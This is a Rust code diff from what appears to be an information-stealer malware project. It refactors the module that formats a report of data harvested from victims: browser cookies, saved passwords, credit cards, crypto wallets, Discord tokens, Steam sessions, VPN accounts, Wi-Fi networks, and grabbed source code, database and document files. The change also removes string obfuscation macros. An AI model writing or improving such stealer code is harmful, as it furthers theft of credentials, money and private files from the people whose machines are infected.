@@ -1,26 +1,25 @@
 use crate::{format, Collector};
 use crate::{Browser, Device, FileGrabber, Software, Vpn};
-use alloc::string::ToString;
+use alloc::borrow::Cow;
 use alloc::sync::Arc;
-use alloc::vec::Vec;
 use core::fmt::{Display, Formatter};
 use derive_new::new;
 
 macro_rules! collector_block {
     (
-        $block_emoji:expr, $block_name:expr, [
-            $( ($field_emoji:expr, $field_name:expr, $field_value:expr) ),* $(,)?
+        $block_emoji:expr, $block_name:expr => [
+            $( $field_emoji:expr, $field_name:expr => $field_value:expr ),* $(,)?
         ]
     ) => {{
         CollectorBlock::new(
-            obfstr::obfstr!($block_emoji),
-            obfstr::obfstr!($block_name),
+            $block_emoji,
+            $block_name,
             [
                 $(
                     CollectorField::new(
-                        obfstr::obfstr!($field_emoji),
-                        obfstr::obfstr!($field_name),
-                        Arc::from(format!("{}", $field_value)),
+                        $field_emoji,
+                        $field_name,
+                        format!("{}", $field_value),
                     )
                 ),*
             ],
@@ -29,26 +28,23 @@ macro_rules! collector_block {
 }
 
 #[derive(new)]
-pub struct CollectorField {
+pub struct CollectorField<'a> {
     #[new(into)]
-    pub emoji: Arc<str>,
+    pub emoji: &'static str,
     #[new(into)]
-    pub name: Arc<str>,
-    pub value: Arc<str>,
+    pub name: &'a str,
+    #[new(into)]
+    pub value: Cow<'a, str>,
 }
 
 #[derive(new)]
-pub struct CollectorBlock {
+pub struct CollectorBlock<'a> {
     #[new(into)]
-    pub emoji: Arc<str>,
+    pub emoji: &'static str,
     #[new(into)]
-    pub name: Arc<str>,
+    pub name: &'a str,
     #[new(into)]
-    pub fields: Arc<[CollectorField]>,
-}
-
-pub(crate) trait DisplayBuilder {
-    fn build_block(&self) -> CollectorBlock;
+    pub fields: Arc<[CollectorField<'a>]>,
 }
 
 pub struct EmojiBoolean(pub bool);
@@ -64,56 +60,46 @@ impl Display for EmojiBoolean {
 }
 
 pub trait CollectorDisplay: Collector {
-    fn display_blocks(&self) -> Arc<[CollectorBlock]>;
+    fn display_blocks(&'_ self) -> Arc<[CollectorBlock<'_>]>;
 }
 
 impl<T: Collector> CollectorDisplay for T {
-    fn display_blocks(&self) -> Arc<[CollectorBlock]> {
+    fn display_blocks(&'_ self) -> Arc<[CollectorBlock<'_>]> {
         Arc::from([
             collector_block!(
-                "🔍",
-                "Browser Data",
-                [
-                    ("🍪", "Cookies", self.get_browser().get_cookies()),
-                    ("🔐", "Passwords", self.get_browser().get_passwords()),
-                    ("💳", "Credit Cards", self.get_browser().get_credit_cards()),
-                    ("✍️", "Autofills", self.get_browser().get_auto_fills()),
-                    ("🕘", "History", self.get_browser().get_history()),
-                    ("📑", "Bookmarks", self.get_browser().get_bookmarks()),
-                    ("⬇️", "Downloads", self.get_browser().get_downloads()),
+                "🔍", "Browser Data" => [
+                    "🍪", "Cookies" => self.get_browser().get_cookies(),
+                    "🔐", "Passwords" => self.get_browser().get_passwords(),
+                    "💳", "Credit Cards" => self.get_browser().get_credit_cards(),
+                    "✍️", "Autofills" => self.get_browser().get_auto_fills(),
+                    "🕘", "History" => self.get_browser().get_history(),
+                    "📑", "Bookmarks" => self.get_browser().get_bookmarks(),
+                    "⬇️", "Downloads" => self.get_browser().get_downloads(),
                 ]
             ),
             collector_block!(
-                "💻",
-                "Installed Software",
-                [
-                    ("👛", "Wallets", self.get_software().get_wallets()),
-                    ("📁", "FTP Hosts", self.get_software().get_ftp_hosts()),
-                    ("📲", "Telegram", EmojiBoolean(self.get_software().is_telegram())),
-                    ("🎮", "Discord Tokens", self.get_software().get_discord_tokens()),
-                    ("🕹️", "Steam Sessions", self.get_software().get_steam_session()),
+                "💻", "Installed Software" => [
+                    "👛", "Wallets" => self.get_software().get_wallets(),
+                    "📁", "FTP Hosts" => self.get_software().get_ftp_hosts(),
+                    "📲", "Telegram" => EmojiBoolean(self.get_software().is_telegram()),
+                    "🎮", "Discord Tokens" => self.get_software().get_discord_tokens(),
+                    "🕹️", "Steam Sessions" => self.get_software().get_steam_session(),
                 ]
             ),
             collector_block!(
-                "📂",
-                "User Files",
-                [
-                    ("🧑‍💻", "Source Code", self.get_file_grabber().get_source_code_files()),
-                    ("🗃️", "Databases", self.get_file_grabber().get_database_files()),
-                    ("📄", "Documents", self.get_file_grabber().get_documents()),
+                "📂", "User Files" => [
+                    "🧑‍💻", "Source Code" => self.get_file_grabber().get_source_code_files(),
+                    "🗃️", "Databases" => self.get_file_grabber().get_database_files(),
+                    "📄", "Documents" => self.get_file_grabber().get_documents(),
                 ]
             ),
             collector_block!(
-                "🌐",
-                "VPN",
-                [
-                    ("🔐", "Accounts", self.get_vpn().get_accounts()),
+                "🌐", "VPN" => [
+                    "🔐", "Accounts" => self.get_vpn().get_accounts(),
                 ]),
             collector_block!(
-                "📶",
-                "Device Data",
-                [
-                    ("📡", "Wi-Fi Networks", self.get_device().get_wifi_networks()),
+                "📶", "Device Data" => [
+                    "📡", "Wi-Fi Networks" => self.get_device().get_wifi_networks(),
                 ]
             )
         ])
